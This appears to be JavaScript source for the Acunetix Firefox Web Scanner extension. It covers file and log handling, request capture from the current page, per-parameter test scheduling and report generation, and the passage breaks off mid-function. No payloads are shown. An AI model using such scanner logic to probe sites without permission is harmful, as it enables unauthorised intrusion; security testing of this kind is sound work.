/*
Author:		Attila Gerendi
Purpose:	Various prototype functions
*/

function typeOf(value)
{
    var s = typeof value;
    if (s === 'object')
	{
        if (value)
		{
            if (typeof value.length === 'number' && !(value.propertyIsEnumerable('length')) && typeof value.splice === 'function')
                s = 'array';
        }
		else
            s = 'null';
    }
    return s;
}

String.prototype.entityify = function ()
{
    return this.replace(/&/g, "&amp;").replace(/</g,"&lt;").replace(/>/g, "&gt;").replace(/\"/g, "&quot;").replace(/\'/g, "&#39;");
};

String.prototype.supplant = function (o)
{
    return this.replace(/{([^{}]*)}/g,
        function (a, b)
		{
            var r = o[b];
            return typeof r === 'string' || typeof r === 'number' ? r : a;
        }
    );
};

String.prototype.trim = function () {
    return this.replace(/^\s*(\S*(\s+\S+)*)\s*$/, "$1");
};


String.prototype.regexEscape = function() {
    var specials = [
      '/', '.', '*', '+', '?', '|',
      '(', ')', '[', ']', '{', '}', '\\'
    ];
    regexp = new RegExp('(\\' + specials.join('|\\') + ')', 'g' );
	return this.replace(regexp, '\\$1');
}
VM894:3 /*
Author:		Attila Gerendi
Purpose:	Ciphers
*/

function encoderClass()
{
	this.encode64	= encode64;
	this.decode64	= decode64;
	this.encode		= encode;
	
	function encode(strInput)
	{
		return(strInput)
	}
	
	function encode64(strInput)
	{
		var tmpStr = "";
		//we must ensure the btoa does not get multibyte characters since it will crash
		for(var i = 0; i < strInput.length; i++)
			tmpStr += String.fromCharCode(strInput.charCodeAt(i) & 0xff);
		return(btoa(tmpStr))
	}
	
	function decode64(strInput)
	{
		return(atob(strInput));
	}
}
VM894:4 /*
Author:     Attila Gerendi
Purpose:    The Elemet highlighter class
*/

function classHTMLElementHighlighter()
{
	this.arrayHighLightedItems = new Array();
	
	this.highlightItem = highlightItem;
	this.searchItemIndex = searchItemIndex;
	
	this.highlightItemInternal = highlightItemInternal;
	
	function searchItemIndex(strId)
	{
		for(var i =0 ; i < this.arrayHighLightedItems.length ; i++)
			if(this.arrayHighLightedItems[i][0]==strId)
				return(i);
		return(-1);
	}
	
	function highlightItemInternal(objDoc, strId, boolMode)
	{
		var item = objDoc.getElementById(strId);
		if (!item)
			return(false);
		
		var currentStyle = "";
		if(item.hasAttribute("style"))
			currentStyle = item.getAttribute("style");
			
		var originalStyle = "";
		var itemIndex = this.searchItemIndex(strId);
		if (itemIndex < 0)
		{
			var itm = new Array(2);
			itm[0] = strId;
			itm[1] = currentStyle;
			if(boolMode)
				this.arrayHighLightedItems.push(itm);
		}
		else
		{
			originalStyle = this.arrayHighLightedItems[itemIndex][1];
		}
		if(boolMode)
			item.setAttribute("style","border: 2px solid #ff0000;");
		else
			item.setAttribute("style",originalStyle);
		return(true);
	}
	
	function highlightItem(strId, boolMode) 
	{
		var boolRetval = false;		
		var objPageDocument = window.top.getBrowser().browsers[window.top.getBrowser().mTabBox.selectedIndex].contentWindow.document;
		
		boolRetval = this.highlightItemInternal(objPageDocument,strId,boolMode);
		if (boolRetval)
			return;
		
		var frames = objPageDocument.getElementsByTagName("frame");
		for (var i = 0; i < frames.length; i++)
		{
			boolRetval = this.highlightItemInternal(frames[i].contentDocument,strId,boolMode);
			if (boolRetval)
				return;
		}
		
		var frames = objPageDocument.getElementsByTagName("irame");
		for (var i = 0; i < frames.length; i++)
		{
			boolRetval = this.highlightItemInternal(frames[i].contentDocument,strId,boolMode);
			if (boolRetval)
				return;
		}
		
	}
}
VM894:5 /*
Author:		Attila Gerendi
Purpose:	The ClassFileHandler
*/

/*
============================== special_path =========================
ProfD 		 = profile directory
DefProfRt 	 = user (e.g., /root/.mozilla)
UChrm		 = %profile%/chrome
DefRt 		 = %installation%/defaults
PrfDef 		 = %installation%/defaults/pref
ProfDefNoLoc = %installation%/defaults/profile
APlugns 	 = %installation%/plugins
AChrom 		 = %installation%/chrome
ComsD 		 = %installation%/components
CurProcD 	 = installation (usually)
Home 		 = OS root (e.g., /root)
TmpD 		 = OS tmp (e.g., /tmp)
resource:app = application directory in a XULRunner app
*/

function ClassFileHandler()
{
	this.strPathSeparator	= "\\";
	
	this.detectOsFileSeparatorByHandlingFiles 	= detectOsFileSeparatorByHandlingFiles;
	this.createDirectory						= createDirectory;
	this.saveTextFile							= saveTextFile;
	this.loadTextFromLocalURI					= loadTextFromLocalURI;
	this.loadTextFile							= loadTextFile;
	this.getFile								= getFile;
	
	this.detectOsFileSeparatorByHandlingFiles();
	if (this.strPathSeparator == "") this.strPathSeparator = "\\";
	
	function getFile(strName, strSpecialPath)
	{
		try
		{
			if((strSpecialPath == null) || (strSpecialPath == ""))
			{
				file = Components.classes["@mozilla.org/file/local;1"]
					.createInstance(Components.interfaces.nsILocalFile);
				file.initWithPath(strName);
			}
			else
			{
				var file = Components.classes['@mozilla.org/file/directory_service;1']
						.getService(Components.interfaces.nsIProperties)
						.get(strSpecialPath, Components.interfaces.nsIFile);

				var strSeparator = "\\";		
				var arrayParts = strName.split(strSeparator);
				for(var i = 0; i < arrayParts.length; i++)
					file.append(arrayParts[i]);
			}
			return({boolSuccess : true, strErrorMessage : "", objFile : file});
		}
		catch(vError)
		{
			return({boolSuccess : false, strErrorMessage : vError.message});
		}
	}
	
	function detectOsFileSeparatorByHandlingFiles()
	{
		try
		{
			
			var file = Components.classes['@mozilla.org/file/directory_service;1']
					.getService(Components.interfaces.nsIProperties)
					.get("PrfDef", Components.interfaces.nsIFile);
			if( file.path.search("\\\\") >= 0)
			{
				this.strPathSeparator	= "\\";
				return("\\");
			}
			else
			{
				this.strPathSeparator	= "/";
				return("/");
			}
			
		}
		catch(vError)
		{
			return("");
		}
	}
	
	function createDirectory(strDirectoryName, strSpecialPath)
	{
		var file = null;
		try
		{
			var objF = this.getFile(strDirectoryName, strSpecialPath);
			if(!objF.boolSuccess)
				return(objF)
			var file = objF.objFile;
			
			if( !file.exists() || !file.isDirectory() )  
				file.create(Components.interfaces.nsIFile.DIRECTORY_TYPE, 0777);
			else
				return({boolSuccess : false, strErrorMessage : "Directory Exist"});
		}
		catch(vError)
		{
			return({boolSuccess : false, strErrorMessage : vError.message});
		}
		
		return({boolSuccess : true, strErrorMessage : "", strPath : file.path});
	}
	
	this.getPath = function(strDirectoryName, strSpecialPath)
	{
		var objF = this.getFile(strDirectoryName, strSpecialPath);
		if(!objF.boolSuccess)
			return(objF)
		var file = objF.objFile;
		if(file) return (file.path);
		return('undefined');
	}
	
	function saveTextFile(strFileName, strOutputBuffer, boolAppendFile, strSpecialPath)
	{
		if(boolAppendFile == null ) boolAppendFile = false;
		
		var file = null;
		try
		{
			var objF = this.getFile(strFileName, strSpecialPath);
			if(!objF.boolSuccess)
				return(objF)
			var file = objF.objFile;

			var foStream = Components.classes["@mozilla.org/network/file-output-stream;1"]
							.createInstance(Components.interfaces.nsIFileOutputStream);
			if(boolAppendFile)
				foStream.init(file, 0x02 | 0x08 | 0x10, 0664, 0); 
			else
				foStream.init(file, 0x02 | 0x08 | 0x20, 0664, 0); // write, create, truncate
			
			foStream.write(strOutputBuffer, strOutputBuffer.length);
			foStream.close();
		}
		catch(vError) 
		{
		  return({boolSuccess : false, strErrorMessage : vError.message});
		}
		return({boolSuccess : true, strErrorMessage : ""});
	}
	
	function loadTextFile(strFileName, strSpecialPath)
	{
		try
		{
			var objF = this.getFile(strFileName, strSpecialPath);
			if(!objF.boolSuccess)
				return(objF)
			var file = objF.objFile;
		
			var istream = Components.classes["@mozilla.org/network/file-input-stream;1"]
									.createInstance(Components.interfaces.nsIFileInputStream);
									
			istream.init(file, 1, 0, false);								
									
			var sstream = Components.classes["@mozilla.org/scriptableinputstream;1"]
									.createInstance(Components.interfaces.nsIScriptableInputStream);
					
			sstream.init(istream);
			var strContent = sstream.read(sstream.available());
			sstream.close();
			istream.close();
		}
		catch(vError) 
		{
			return({boolSuccess : false, strErrorMessage : vError.message});
		}
		return({boolSuccess : true, strErrorMessage : "", strContent : strContent});
	}
	
	function loadTextFromLocalURI(strFileName)
	{
		try
		{
			var httpreq = new XMLHttpRequest();
			httpreq.open("GET", strFileName, false);
			httpreq.send(null);
			return({boolSuccess : true, strErrorMessage : "", strContent : httpreq.responseText});
		}
		catch(vError)
		{
			return({boolSuccess : false, strErrorMessage : vError.message, strContent : ""});
		}
	}
}
VM894:6 /*
Author:		Attila Gerendi
Purpose:	The main classes  acunetixwebscanner, classScanningProcessStatus, classAsincronTester
*/

var acunetixwebscanner =
{
	generalEncoder			: new encoderClass(),
	intParameterIndex		: 0,
	objHighlighter			: new classHTMLElementHighlighter(),
	objRequestCollection	: null,
	xulObjScannerOutputTab	: null,
	xulObjScannerHTTPLogTab	: null,
	xulObjScannerFuncLogTab	: null,
	objScanningProcessStatus: new classScanningProcessStatus(),
	generalTimer			: Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer),
	objMozPrefs 			: Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefService).getBranch("extensions.acunetixwebscanner."),
	arrayOfTestProcedures 	: new Array(),
	strAllowedScanType		: "acunetix_menu_testAll",
	objFileHandler			: new ClassFileHandler(),
	
	onLoad: function()
	{
		// initialization code
		this.initialized				= true;
		this.strings 					= document.getElementById("acunetixwebscanner-strings");
				
		var tmp = this.objFileHandler.createDirectory("AcunetixScanner", "Home");
		if (tmp.boolSuccess) //directory not existent => first start
		{			
			this.objMozPrefs.setCharPref("strHTTPLoginFileName",tmp.strPath + this.objFileHandler.strPathSeparator + "HTTPLog.txt");
			this.objMozPrefs.setCharPref("strFunctionalLoggingFileName",tmp.strPath + this.objFileHandler.strPathSeparator + "applicationLog.txt");
		}
		
		if ( this.objMozPrefs.getBoolPref("boolDeleteLogFilesAtStartup") )
		{
			acunetixwebscanner.objFileHandler.saveTextFile(this.objMozPrefs.getCharPref("strHTTPLoginFileName"), "", false);
			acunetixwebscanner.objFileHandler.saveTextFile(this.objMozPrefs.getCharPref("strFunctionalLoggingFileName"), "", false);
		}
		
		
		var objtoolbar = document.getElementById("acunetix_toolbar");
		if(objtoolbar)
			objtoolbar.addEventListener('DOMAttrModified', this.toolbarChanged, false);
		
		this.showHideRequestPannel("settings");

		this.populateTestTypeMenu();
	},
	
	
	toolbarChanged : function(e)
	{
		if(e.attrName == "collapsed")
		{
			acunetixwebscanner.showHideRequestPannel("settings", e.newValue);
		}
	},
	
// commands from UI START

	goHome : function()
	{
		gBrowser.selectedTab = gBrowser.addTab("http://www.acunetix.com/");
	},

	resetLogFile :	function(intFile)
	{
		if(intFile == 0)
		{
			if( ! confirm (acunetixwebscanner.strings.getString("confirm.HTTPLogFileDeletion")) )
				return;
			acunetixwebscanner.objFileHandler.saveTextFile(this.objMozPrefs.getCharPref("strHTTPLoginFileName"), "", false);
		}
		else
		{
			if( ! confirm (acunetixwebscanner.strings.getString("confirm.FunctionalLogFileDeletion")) )
				return;
			acunetixwebscanner.objFileHandler.saveTextFile(this.objMozPrefs.getCharPref("strFunctionalLoggingFileName"), "", false);
		}
	},

	openLogFileInNewTab : function (intFile)
	{
		if(intFile == 0)
		{
			try
			{
				this.xulObjScannerHTTPLogTab.linkedBrowser.contentWindow.document;
			}
			catch(e)
			{
				var mainWindow = window.QueryInterface(Components.interfaces.nsIInterfaceRequestor)
						   .getInterface(Components.interfaces.nsIWebNavigation)
						   .QueryInterface(Components.interfaces.nsIDocShellTreeItem)
						   .rootTreeItem
						   .QueryInterface(Components.interfaces.nsIInterfaceRequestor)
						   .getInterface(Components.interfaces.nsIDOMWindow);
				this.xulObjScannerHTTPLogTab = mainWindow.getBrowser().addTab("");
			}
			this.xulObjScannerHTTPLogTab.linkedBrowser.contentWindow.open("file://" + this.objMozPrefs.getCharPref("strHTTPLoginFileName"),"_self")
			gBrowser.selectedTab = this.xulObjScannerHTTPLogTab;
		}
		else
		{
			try
			{
				this.xulObjScannerFuncLogTab.linkedBrowser.contentWindow.document;
			}
			catch(e)
			{
				var mainWindow = window.QueryInterface(Components.interfaces.nsIInterfaceRequestor)
						   .getInterface(Components.interfaces.nsIWebNavigation)
						   .QueryInterface(Components.interfaces.nsIDocShellTreeItem)
						   .rootTreeItem
						   .QueryInterface(Components.interfaces.nsIInterfaceRequestor)
						   .getInterface(Components.interfaces.nsIDOMWindow);
				this.xulObjScannerFuncLogTab = mainWindow.getBrowser().addTab("");
				gBrowser.selectedTab = this.xulObjScannerFuncLogTab;
			}
			this.xulObjScannerFuncLogTab.linkedBrowser.contentWindow.open("file://" + this.objMozPrefs.getCharPref("strFunctionalLoggingFileName"),"_self")
		}
	},

	showHideRequestPannel : function(strMode, boolMode)
	{
		var boolVisible = false;
		switch(strMode)
		{
			case "forced":
				boolVisible = boolMode;
				this.objMozPrefs.setBoolPref("boolIsRequestPannelVisible", boolVisible);
				break;
			case "toggle":
				boolVisible = !this.objMozPrefs.getBoolPref("boolIsRequestPannelVisible");
				this.objMozPrefs.setBoolPref("boolIsRequestPannelVisible", boolVisible);
				break;
			case "settings":
				boolVisible = this.objMozPrefs.getBoolPref("boolIsRequestPannelVisible");
				break;
			case "show":
				boolVisible = true;
				this.objMozPrefs.setBoolPref("boolIsRequestPannelVisible", boolVisible);
				break;
		}
		
		if(document.getElementById('acunetix_menu_showAdvancedPannel'))
			document.getElementById('acunetix_menu_showAdvancedPannel').setAttribute("checked", this.objMozPrefs.getBoolPref("boolIsRequestPannelVisible"));
		
		var objtoolbar = document.getElementById("acunetix_toolbar");
		if ((objtoolbar) && (objtoolbar.collapsed))
		{
			boolVisible = false;
		}
		
		var objacunetix_appcontent_bottomContainerBox = document.getElementById('acunetix_appcontent_bottomContainerBox');
		var objacunetix_appcontent_bottomContainerBoxSplitter = document.getElementById('acunetix_appcontent_bottomContainerBoxSplitter');
		
		if(boolVisible)
		{
			if(objacunetix_appcontent_bottomContainerBox)
				objacunetix_appcontent_bottomContainerBox.collapsed = false;
			if(objacunetix_appcontent_bottomContainerBoxSplitter)
					objacunetix_appcontent_bottomContainerBoxSplitter.collapsed = false;
		}
		else
		{
			if(objacunetix_appcontent_bottomContainerBox)
				objacunetix_appcontent_bottomContainerBox.collapsed = true;
			if(objacunetix_appcontent_bottomContainerBoxSplitter)
				objacunetix_appcontent_bottomContainerBoxSplitter.collapsed = true;
		}
	},

	quickTest : function(objXULMenuItem)
	{
		
		if(this.objScanningProcessStatus.boolScannerActive)
			return;
		
		this.strAllowedScanType = objXULMenuItem.id;
		
		var objPageDocument=window.top.getBrowser().browsers[window.top.getBrowser().mTabBox.selectedIndex].contentWindow.document;
		if (objPageDocument)
		{
			this.objRequestCollection = new classRequestColection();
			//empty request list
			this.objRequestCollection.arrayRequests.length = 0; 			
			this.objRequestCollection.extractRequestCollectionFromPage(objPageDocument);
			
			var objdoc = document.getElementById('acunetix_appcontent_pageRequestListBox');
			this.objRequestCollection.renderRequest(objdoc);
			
			if (this.objRequestCollection.arrayRequests.length == 0 ) return;
				
			this.objScanningProcessStatus.arrayObjAsincronTester 	= new Array();
			
			for(var i = 0; i < this.objRequestCollection.arrayRequests.length; i++)
			{     
				this.objScanningProcessStatus.arrayObjAsincronTester[i] = new classAsincronTester(this.objRequestCollection.arrayRequests[i]);
				if(i > 0)
					this.objScanningProcessStatus.arrayObjAsincronTester[i-1].objNextAsincronTester = this.objScanningProcessStatus.arrayObjAsincronTester[i];
			}
			this.objScanningProcessStatus.boolIsQuickScan = true;
			this.objScanningProcessStatus.startScanningProcess();
			this.objScanningProcessStatus.arrayObjAsincronTester[0].doTest(); 			
		}	
	},

	setAllowedScanType : function(objXULMenuItem)
	{
		this.strAllowedScanType = objXULMenuItem.id;
	},

	abortScan : function()
	{
		if(!this.objScanningProcessStatus.boolScannerActive)
			return;
		this.objScanningProcessStatus.abortScan();
	},
	
	cmdChangeRequestParameter : function (strId,strParamName,strValue)
	{
		//alert("strIdf: " + strId + " strParamName: " + strParamName + " strValue: " + strValue)
	    var requestParam = this.objRequestCollection.getRequestParameterWithGivenId(strId);
		if (requestParam != null)
	    {
	        requestParam[strParamName] = !! strValue;
	    }
	},
	
	testGivenRequest : function(requestID)
	{
		if(this.objScanningProcessStatus.boolScannerActive)
			return;
		
		var objRequest = this.objRequestCollection.getRequestWithGivenID(requestID);
		
		if(objRequest != null)
		{
			this.strAllowedScanType = "acunetix_menu_testStandardSet";
			
			this.objScanningProcessStatus.boolIsQuickScan 									= false;
			this.objScanningProcessStatus.arrayObjAsincronTester							= new Array();
			this.objScanningProcessStatus.arrayObjAsincronTester[0]							= new classAsincronTester(objRequest);
			this.objScanningProcessStatus.arrayObjAsincronTester[0].objNextAsincronTester 	= null;
			this.objScanningProcessStatus.startScanningProcess();
			this.objScanningProcessStatus.arrayObjAsincronTester[0].doTest();
		}
	},
	
	reloadDataForGivenRequest : function(requestID)
	{
		var request = this.objRequestCollection.getRequestWithGivenID(requestID);
		if(request != null)
			request.refreshParametersData();
	},

	togleGivenRequestOFF : function(requestID)
	{
		if(this.objScanningProcessStatus.boolScannerActive)
			return;
		var request = this.objRequestCollection.getRequestWithGivenID(requestID);
		if(request != null)
		{
			for(var i = 0; i < request.arrayParameters.length; i++)
			{
				request.arrayParameters[i].boolApplyTestPaterns = false;
				document.getElementById("applyTestPatterns_" + request.arrayParameters[i].strId).checked = false;
			}
		}
	},

	togleGivenRequestON : function(requestID)
	{
		if(this.objScanningProcessStatus.boolScannerActive)
			return;
		var request = this.objRequestCollection.getRequestWithGivenID(requestID);
		if(request != null)
		{
			for(var i = 0; i < request.arrayParameters.length; i++)
			{
				request.arrayParameters[i].boolApplyTestPaterns = true;
				document.getElementById("applyTestPatterns_" + request.arrayParameters[i].strId).checked = true;
			}
		}
	},

	capturePageRequests : function() 
	{
		if(this.objScanningProcessStatus.boolScannerActive)
			return;
		this.showHideRequestPannel("show");
		var objPageDocument=window.top.getBrowser().browsers[window.top.getBrowser().mTabBox.selectedIndex].contentWindow.document;
		if (objPageDocument)
		{
			this.objRequestCollection = new classRequestColection();
			//empty request list
			this.objRequestCollection.arrayRequests.length = 0;  
			this.objRequestCollection.extractRequestCollectionFromPage(objPageDocument);
			var doc = document.getElementById('acunetix_appcontent_pageRequestListBox');
			this.objRequestCollection.renderRequest(doc);
			alert("Capture done!");
		}
	},
	
	openSettingsDialog : function()
	{
		if(this.objScanningProcessStatus.boolScannerActive)
			return;
		window.openDialog("chrome://acunetixwebscanner/content/options.xul", "",  "modal,chrome,dialog,centerscreen");
	},
// commands from UI END

	populateTestTypeMenu : function()
	{
		logToFile("acunetixwebscanner/populateTestTypeMenu (" + this.arrayOfTestProcedures.length + ")", 2);
				
		var objTestTypeParent = document.getElementById("acunetix_menu_selectTest_selector");
		
		for(var i = 0; i < this.arrayOfTestProcedures.length; i++)
		{
			logToFile("acunetixwebscanner/populateTestTypeMenu = > " + this.arrayOfTestProcedures[i].strXULMenuText, 2);
			
			this.arrayOfTestProcedures[i].intVulnerabilitiesCount = 0;
			// var objMenuItem = document.createElementNS("http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul", "menuitem"); lol we love the new firefox 3 dont we ?
			var objMenuItem = document.createElementNS( "http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul", "menuitem");
			

			if(objMenuItem)
			{
				objMenuItem.setAttribute("id", this.arrayOfTestProcedures[i].strXULMenuId);
				objMenuItem.setAttribute("label", this.arrayOfTestProcedures[i].strXULMenuText);
				objMenuItem.setAttribute("tooltiptext", this.arrayOfTestProcedures[i].strXULMenuHint);
				objMenuItem.setAttribute("oncommand", "acunetixwebscanner.quickTest(this)");
				if(this.arrayOfTestProcedures[i].strXULMenuAccesskey != "")
					objMenuItem.setAttribute("accesskey", this.arrayOfTestProcedures[i].strXULMenuAccesskey);
				if(!this.arrayOfTestProcedures[i].enabled)
					objMenuItem.setAttribute("disabled", "true");
				if(objTestTypeParent)
					objTestTypeParent.appendChild(objMenuItem);
			}
		}
	},

	isTestAllowed : function(intTestIndex)
	{
		logToFile("acunetixwebscanner/isTestAllowed for: " + this.arrayOfTestProcedures[intTestIndex].strTestName + " (" + intTestIndex + "), strAllowedScanType: " + this.strAllowedScanType);
		
		if(!this.arrayOfTestProcedures[intTestIndex].enabled)
			return(false);
		
		if(this.strAllowedScanType == "acunetix_menu_testAll")
		{
			logToFile("acunetixwebscanner/isTestAllowed => true");
			return(true);
		}
		try
		{
			if(this.strAllowedScanType == "acunetix_menu_testStandardSet")
			{
				var retval = this.objMozPrefs.getBoolPref("boolTestEnabled" + (intTestIndex + 1))
				logToFile("acunetixwebscanner/isTestAllowed => (" + (intTestIndex + 1) + ") = " + retval);
				return(retval);
			}
		}
		catch(e)
		{
			logToFile("acunetixwebscanner/isTestAllowed => false " + e);
			return(false);
		}
		
		var retval = (this.strAllowedScanType == this.arrayOfTestProcedures[intTestIndex].strXULMenuId);
		logToFile("acunetixwebscanner/isTestAllowed => " + retval);
		return(retval);
	}
};

window.addEventListener("load", function(e) { acunetixwebscanner.onLoad(e); }, false);

function classScanningProcessStatus()
{
	this.boolScannerActive 				= false;
	this.strTestResultHTMLOutput 		= "";
	this.boolAbortScan					= false;
	this.arrayObjAsincronTester			= new Array();
	
	this.intTestProcedureIndex			= 0;
	this.intMaxTestProcedureNumber		= 0;
	
	this.intTestIndex					= 0;
	this.intMaxTestNumber				= 0;
	
	this.intGroupIndex					= 0;
	this.intMaxGroupNumber				= 0;
	
	this.intVulnerableFoundNumber		= 0;
	this.intTotalRequestHandled			= 0;
	this.intTotalRequestHandlingError	= 0;
	
	this.objStartScanTime				= null;
	this.boolIsQuickScan				= false;
	

	this.startScanningProcess = function()
	{
		logToFile("classScanningProcessStatus/startScanningProcess");
		
		var objVulnLabelGroup = document.getElementById("acunetix_tooltip_onVulnerableLabel");
		var objVulnValueGroup = document.getElementById("acunetix_tooltip_onVulnerableValue");
		
		if(objVulnLabelGroup)
			while (objVulnLabelGroup.childNodes.length > 0)
				objVulnLabelGroup.removeChild(objVulnLabelGroup.childNodes[0]);
		if(objVulnValueGroup)
			while (objVulnValueGroup.childNodes.length > 0)
				objVulnValueGroup.removeChild(objVulnValueGroup.childNodes[0]);
  
		
		for(var i = 0; i < acunetixwebscanner.arrayOfTestProcedures.length; i++)
			acunetixwebscanner.arrayOfTestProcedures[i].intVulnerabilitiesCount = 0;
		
		var tmpstr = "";
		tmpstr = tmpstr + "<!-- Acunetix Firefox Web Scanner Export -->\r\n";
		tmpstr = tmpstr + "<AcunetixFirefoxWebScannerReport>\r\n";
		tmpstr = tmpstr + "\t<Vulnerabilities>\r\n";
		
		acunetixwebscanner.objFileHandler.saveTextFile("AcunetixScanner\\wvs.xml", tmpstr, false, "Home");
		
		this.strTestResultHTMLOutput 		= "";
		
		this.intTotalRequestHandled			= 0;
		this.intTotalRequestHandlingError	= 0;
		this.intVulnerableFoundNumber 		= 0;
		this.objStartScanTime				= new Date();
		
		this.boolScannerActive				= true;
		this.boolAbortScan					= false;
		
		this.intGroupIndex					= 0;
		this.intTestIndex					= 0;
		this.intTestProcedureIndex			= 0;
		
		this.intMaxGroupNumber 				= acunetixwebscanner.objRequestCollection.arrayRequests.length;
		this.intMaxTestProcedureNumber		= 0;
		
		for(var i = 0; i < acunetixwebscanner.arrayOfTestProcedures.length; i++)
			if(acunetixwebscanner.isTestAllowed(i))
				this.intMaxTestProcedureNumber ++;
		
		this.intMaxTestNumber				= 0		
		
		for(var i = 0; i < this.arrayObjAsincronTester.length; i++)
			this.intMaxTestNumber = this.intMaxTestNumber + this.arrayObjAsincronTester[i].objRequest.generateParameterMannipulationCombinations() * this.intMaxTestProcedureNumber;
		
		
		this.RenderScannerStatus();
		
		//disable the interface
		if(document.getElementById("acunetix_menu_abortScan"))
			document.getElementById("acunetix_menu_abortScan").disabled 			= false;
		if(document.getElementById("acunetix_menu_settings"))
			document.getElementById("acunetix_menu_settings").disabled 				= true;
		if(document.getElementById("acunetix_menu_selectTest"))
			document.getElementById("acunetix_menu_selectTest").disabled	= true;
		if(document.getElementById("acunetix_menu_advanced").disabled)
			document.getElementById("acunetix_menu_advanced").disabled 					= true;
		
		if(document.getElementById("acunetix_scannerStatus2"))
			document.getElementById("acunetix_scannerStatus2").value = "";
		
		for(var i = 0; i < this.arrayObjAsincronTester.length; i++)
		{
			if(document.getElementById("request_test_" + this.arrayObjAsincronTester[i].objRequest.strId))
				document.getElementById("request_test_" + this.arrayObjAsincronTester[i].objRequest.strId).disabled = true;
			if(document.getElementById("request_reload_" + this.arrayObjAsincronTester[i].objRequest.strId))
				document.getElementById("request_reload_" + this.arrayObjAsincronTester[i].objRequest.strId).disabled = true;
			if(document.getElementById("request_toggleon_" + this.arrayObjAsincronTester[i].objRequest.strId))
				document.getElementById("request_toggleon_" + this.arrayObjAsincronTester[i].objRequest.strId).disabled = true;
			if(document.getElementById("request_toggleoff_" + this.arrayObjAsincronTester[i].objRequest.strId))
				document.getElementById("request_toggleoff_" + this.arrayObjAsincronTester[i].objRequest.strId).disabled = true;
		}
		
		if(acunetixwebscanner.objMozPrefs.getBoolPref("boolDeleteLogFilesAtScanStart"))
		{
			acunetixwebscanner.objFileHandler.saveTextFile(acunetixwebscanner.objMozPrefs.getCharPref("strHTTPLoginFileName"), "", false);
			acunetixwebscanner.objFileHandler.saveTextFile(acunetixwebscanner.objMozPrefs.getCharPref("strFunctionalLoggingFileName"), "", false);
		}
	}
	
	this.stopScanningProcess = function()
	{
		
		if(! this.boolScannerActive)
			return;
		this.boolScannerActive = false;
		
		//reenable the interface
		if(document.getElementById("acunetix_menu_abortScan"))
			document.getElementById("acunetix_menu_abortScan").disabled 			= true;
		if(document.getElementById("acunetix_menu_advanced"))
			document.getElementById("acunetix_menu_advanced").disabled 					= false;
		if(document.getElementById("acunetix_menu_settings"))
			document.getElementById("acunetix_menu_settings").disabled 				= false;
		if(document.getElementById("acunetix_menu_selectTest"))
			document.getElementById("acunetix_menu_selectTest").disabled	= false;
		
		for(var i = 0; i < this.arrayObjAsincronTester.length; i++)
		{
			if(document.getElementById("request_test_" + this.arrayObjAsincronTester[i].objRequest.strId))
				document.getElementById("request_test_" + this.arrayObjAsincronTester[i].objRequest.strId).disabled = false;
			if(document.getElementById("request_reload_" + this.arrayObjAsincronTester[i].objRequest.strId))
				document.getElementById("request_reload_" + this.arrayObjAsincronTester[i].objRequest.strId).disabled = false;
			if(document.getElementById("request_toggleon_" + this.arrayObjAsincronTester[i].objRequest.strId))
				document.getElementById("request_toggleon_" + this.arrayObjAsincronTester[i].objRequest.strId).disabled = false;
			if(document.getElementById("request_toggleoff_" + this.arrayObjAsincronTester[i].objRequest.strId))
				document.getElementById("request_toggleoff_" + this.arrayObjAsincronTester[i].objRequest.strId).disabled = false;
		}
		
		this.RenderScannerStatus();
		
		for(var i = 0; i < this.arrayObjAsincronTester.length; i++)
			this.buildRequestTestOutput(this.arrayObjAsincronTester[i].objRequest, this.arrayObjAsincronTester[i].arrayTestResults);
		
		logToFile("classScanningProcessStatus/stopScanningProcess/aborted = " + this.boolAbortScan);
		
		var objStopScanTime		= new Date();
		
		var tmpstr = ""
		tmpstr = tmpstr + "\t</Vulnerabilities>\r\n";
		tmpstr = tmpstr + "\t<scanInfo>\r\n";
		tmpstr = tmpstr + "\t\t<startTime>" + formatDateForWVSExport(this.objStartScanTime) + "</startTime>\r\n";
		tmpstr = tmpstr + "\t\t<stopTime>" + formatDateForWVSExport(objStopScanTime) + "</stopTime>\r\n";
		tmpstr = tmpstr + "\t</scanInfo>\r\n";
		tmpstr = tmpstr + "</AcunetixFirefoxWebScannerReport>";
		acunetixwebscanner.objFileHandler.saveTextFile("AcunetixScanner\\wvs.xml",tmpstr, true, "Home");
		
		var strStatus	= "Done"
		if(this.boolAbortScan)
			strStatus = "Aborted";
		
		var strContent = ""
			
		acunetixwebscanner.objFileHandler.saveTextFile("AcunetixScanner\\temp.html",strContent, false, "Home");
		
		var time =  Math.floor((objStopScanTime - this.objStartScanTime )/1000);
		var hours = Math.floor(time/(60*60));
		var minutes = Math.floor((time - hours*60*60 )/60);
		var seconds = time - hours*60*60 - minutes*60;
		var strTimeElapsed = seconds + " seconds";
		if(minutes > 0) strTimeElapsed = minutes + " minutes, " + strTimeElapsed;
		if(hours > 0) strTimeElapsed = hours + " hours, " + strTimeElapsed;
		
		//save the result to temporal file:
		strContent = acunetixwebscanner.objFileHandler.loadTextFromLocalURI("chrome://acunetixwebscanner/content/report.style").strContent + " ";
		strContent = strContent.replace("{time_elapsed}", strTimeElapsed);
		strContent = strContent.replace("{request_list}",acunetixwebscanner.objScanningProcessStatus.strTestResultHTMLOutput);
		strContent = strContent.replace("{test_status}",strStatus);
		strContent = strContent.replace("{test_vulnerabilities}", this.intVulnerableFoundNumber);
		strContent = strContent.replace("{test_requestHandled}", this.intTotalRequestHandled);
		strContent = strContent.replace("{test_erros}", this.intTotalRequestHandlingError);
		
				
		acunetixwebscanner.objFileHandler.saveTextFile("AcunetixScanner\\ScanResult.html", strContent, false, "Home");		
		strContent = strContent.replace(/target="_blank" href="[^"]"*/ig, "");
		acunetixwebscanner.objFileHandler.saveTextFile("AcunetixScanner\\ScanResult2.html", strContent, false, "Home");
		strContent = "";
		
		var win = window.open("chrome://acunetixwebscanner/content/onScanEndDialog.xul", "ScanEndDialog", "chrome, resizable, centerscreen, modal");
		
		
		if(acunetixwebscanner.objMozPrefs.getBoolPref("boolOpenResultInFirefox"))
		{
			var mainWindow = window.QueryInterface(Components.interfaces.nsIInterfaceRequestor)
						   .getInterface(Components.interfaces.nsIWebNavigation)
						   .QueryInterface(Components.interfaces.nsIDocShellTreeItem)
						   .rootTreeItem
						   .QueryInterface(Components.interfaces.nsIInterfaceRequestor)
						   .getInterface(Components.interfaces.nsIDOMWindow);
			
			acunetixwebscanner.xulObjScannerOutputTab = mainWindow.getBrowser().addTab("");
